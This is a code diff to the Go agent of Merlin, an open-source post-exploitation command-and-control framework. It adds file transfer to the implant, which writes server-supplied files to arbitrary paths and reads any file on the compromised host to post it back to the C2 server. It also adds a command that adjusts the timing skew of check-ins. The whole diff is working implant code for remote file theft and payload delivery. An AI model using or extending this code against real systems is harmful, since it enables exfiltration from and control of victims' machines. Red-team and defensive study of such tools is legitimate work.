@@ -1,6 +1,6 @@
 // Merlin is a post-exploitation command and control framework.
 // This file is part of Merlin.
-// Copyright (C) 2017  Russel Van Tuyl
+// Copyright (C) 2018  Russel Van Tuyl
 
 // Merlin is free software: you can redistribute it and/or modify
 // it under the terms of the GNU General Public License as published by
@@ -18,11 +18,14 @@
 package main
 
 import (
+	// Standard
 	"bytes"
 	"crypto/tls"
+	"encoding/base64"
 	"encoding/json"
 	"flag"
 	"fmt"
+	"io/ioutil"
 	"math/rand"
 	"net"
 	"net/http"
@@ -31,11 +34,17 @@ import (
 	"runtime"
 	"strconv"
 	"time"
+	"crypto/sha1"
+	"io"
+	"path/filepath"
 
+	// 3rd Party
 	"github.com/fatih/color"
 	"github.com/satori/go.uuid"
 	"golang.org/x/net/http2"
 
+	// Merlin
+	"github.com/Ne0nd0g/merlin/pkg"
 	"github.com/Ne0nd0g/merlin/pkg/agent"
 	"github.com/Ne0nd0g/merlin/pkg/messages"
 )
@@ -53,7 +62,6 @@ var waitTime = 30000 * time.Millisecond
 var agentShell = ""
 var paddingMax = 4096
 var src = rand.NewSource(time.Now().UnixNano())
-var version = "nonRelease"
 var build = "nonRelease"
 var maxRetry = 7
 var failedCheckin = 0
@@ -80,7 +88,7 @@ func main() {
 	rand.Seed(time.Now().UTC().UnixNano())
 
 	if verbose {
-		color.Yellow("[-]Agent version: %s", version)
+		color.Yellow("[-]Agent version: %s", merlin.Version)
 		color.Yellow("[-]Agent build: %s", build)
 	}
 
@@ -285,6 +293,129 @@ func statusCheckIn(host string, client *http.Client) {
 			color.Green("%s Message Type Received!", j.Type)
 		}
 		switch j.Type { // TODO add self destruct that will find the .exe current path and start a new process to delete it after initial sleep
+		case "FileTransfer":
+			var p messages.FileTransfer
+			json.Unmarshal(payload, &p)
+
+			g := messages.Base{
+				Version: 1.0,
+				ID:      j.ID,
+				Padding: randStringBytesMaskImprSrc(paddingMax),
+			}
+
+			// Agent will be downloading a file from the server
+			if p.IsDownload {
+				if verbose {color.Green("FileTransfer type: Download")}
+				// Setup the message to submit the status of the upload
+				c := messages.CmdResults{
+					Job:    p.Job,
+					Stdout: "",
+					Stderr: "",
+				}
+
+				d, _ := filepath.Split(p.FileLocation)
+				_, directoryPathErr := os.Stat(d)
+				if directoryPathErr != nil {
+					if verbose {
+						color.Red("[!]There was an error getting the FileInfo structure for the directory %s", d)
+						color.Red(directoryPathErr.Error())
+					}
+					c.Stderr = fmt.Sprintf("[!]There was an error getting the FileInfo structure for the " +
+						"remote directory %s:\r\n", p.FileLocation)
+					c.Stderr += fmt.Sprintf(directoryPathErr.Error())
+				}
+				if c.Stderr == "" {
+					if verbose {
+						color.Yellow("[-]Writing file to %s", p.FileLocation)
+					}
+					downloadFile, downloadFileErr := base64.StdEncoding.DecodeString(p.FileBlob)
+					if downloadFileErr != nil {
+						c.Stderr = downloadFileErr.Error()
+						if verbose {
+							color.Red("[!]There was an error decoding the fileBlob")
+							color.Red(downloadFileErr.Error())
+						}
+					} else {
+						errF := ioutil.WriteFile(p.FileLocation, downloadFile, 0644)
+						if errF != nil {
+							c.Stderr = err.Error()
+							if verbose {
+								color.Red("[!]There was an error writing to : %s", p.FileLocation)
+								color.Red(errF.Error())
+							}
+						} else {
+							if verbose {
+								color.Green("[+]Successfully download file to %s", p.FileLocation)
+							}
+							c.Stdout = fmt.Sprintf("Successfully uploaded file to %s on agent", p.FileLocation)
+						}
+					}
+				}
+
+				k, _ := json.Marshal(c)
+				g.Type = "CmdResults"
+				g.Payload = (*json.RawMessage)(&k)
+			}
+
+			// Agent will uploading a file to the server
+			if !p.IsDownload {
+				if verbose {color.Green("FileTransfer type: Upload")}
+
+				fileData, fileDataErr := ioutil.ReadFile(p.FileLocation)
+				if fileDataErr != nil {
+					if verbose {
+						color.Red("[!]There was an error reading %s", p.FileLocation)
+						color.Red(fileDataErr.Error())
+					}
+					errMessage := fmt.Sprintf("[!]There was an error reading %s\r\n", p.FileLocation)
+					errMessage += fileDataErr.Error()
+					c := messages.CmdResults{
+						Job:    p.Job,
+						Stderr: errMessage,
+					}
+					if verbose {
+						color.Yellow("[-]Sending error message to sever.")
+					}
+					k, _ := json.Marshal(c)
+					g.Type = "CmdResults"
+					g.Payload = (*json.RawMessage)(&k)
+
+				} else {
+					fileHash := sha1.New()
+					io.WriteString(fileHash, string(fileData))
+
+					if verbose {
+						color.Yellow("[-]Uploading file %s of size %d bytes and a SHA1 hash of %x to the server",
+							p.FileLocation,
+							len(fileData),
+							fileHash.Sum(nil))
+					}
+					c := messages.FileTransfer{
+						FileLocation: p.FileLocation,
+						FileBlob:     base64.StdEncoding.EncodeToString([]byte(fileData)),
+						IsDownload:   true,
+						Job:          p.Job,
+					}
+
+					k, _ := json.Marshal(c)
+					g.Type = "FileTransfer"
+					g.Payload = (*json.RawMessage)(&k)
+
+				}
+			}
+			b2 := new(bytes.Buffer)
+			json.NewEncoder(b2).Encode(g)
+			resp2, respErr := client.Post(host, "application/json; charset=utf-8", b2)
+			if respErr != nil {
+				if verbose {
+					color.Red("There was an error sending the FileTransfer message to the server")
+					color.Red(respErr.Error())
+				}
+			}
+			if resp2.StatusCode != 200 {
+				color.Red("Message error from server. HTTP Status code: %d", resp2.StatusCode)
+			}
+
 		case "CmdPayload":
 			var p messages.CmdPayload
 			json.Unmarshal(payload, &p)
@@ -350,6 +481,18 @@ func statusCheckIn(host string, client *http.Client) {
 						color.Red("The provided time was: %s", t.String())
 					}
 				}
+			case "skew":
+				t, err := strconv.ParseInt(p.Args, 10, 64)
+				if err != nil {
+					if verbose {
+						color.Red("[!]There was an error changing the agent skew interval")
+					}
+				}
+				if verbose {
+					color.Yellow("[-]Setting agent skew interval to %d", t)
+				}
+				waitSkew = t
+				agentInfo(host, client)
 			case "padding":
 				t, err := strconv.Atoi(p.Args)
 				if err != nil {
@@ -466,12 +609,13 @@ func randStringBytesMaskImprSrc(n int) string {
 
 func agentInfo(host string, client *http.Client) {
 	i := messages.AgentInfo{
-		Version:       version,
+		Version:       merlin.Version,
 		Build:         build,
 		WaitTime:      waitTime.String(),
 		PaddingMax:    paddingMax,
 		MaxRetry:      maxRetry,
 		FailedCheckin: failedCheckin,
+		Skew:		   waitSkew,
 	}
 
 	payload, errP := json.Marshal(i)
@@ -541,3 +685,5 @@ func agentInfo(host string, client *http.Client) {
 // TODO set message jitter
 // TODO get and return IP addresses with initial checkin
 // TODO Update Makefile to remove debug stacktrace for agents only. GOTRACEBACK=0 #https://dave.cheney.net/tag/gotraceback https://golang.org/pkg/runtime/debug/#SetTraceback
+// TODO Add standard function for printing messages like in the JavaScript agent. Make it a lib for agent and server?
+// TODO send cmdResult for agentcontrol messages
